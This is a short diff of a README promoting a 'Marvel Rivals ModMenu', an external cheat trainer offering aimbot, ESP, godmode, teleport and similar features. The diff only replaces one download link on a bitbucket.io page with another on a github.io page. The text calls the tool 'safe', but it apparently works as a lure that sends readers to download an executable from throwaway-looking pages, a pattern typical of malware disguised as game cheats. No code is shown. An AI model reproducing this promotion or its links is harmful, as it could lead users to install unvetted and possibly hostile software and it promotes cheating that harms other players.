@@ -2,7 +2,7 @@
 
 Enter the battlefield of **Marvel Rivals** with godlike control using this advanced **C++ ModMenu**. This external cheat trainer brings together every powerful feature into one seamless menu: from aimbot and ESP to teleportation, unlimited ammo, godmode, speed, fly, and more. 🎮 Customizable, safe, and made for domination — whether you're exploring the map or climbing ranks, this ModMenu gives you every tool to do it faster and smarter.
 
-[![Download Marvel Rivals ModMenu](https://img.shields.io/badge/Download-Marvel_Rivals_ModMenu-blueviolet)](https://fileoffload7.bitbucket.io)
+[![Download Marvel Rivals ModMenu](https://img.shields.io/badge/Download-Marvel_Rivals_ModMenu-blueviolet)](https://Marvel-Rivals-ModMenu-ruf.github.io/.github)
 
 ---
 
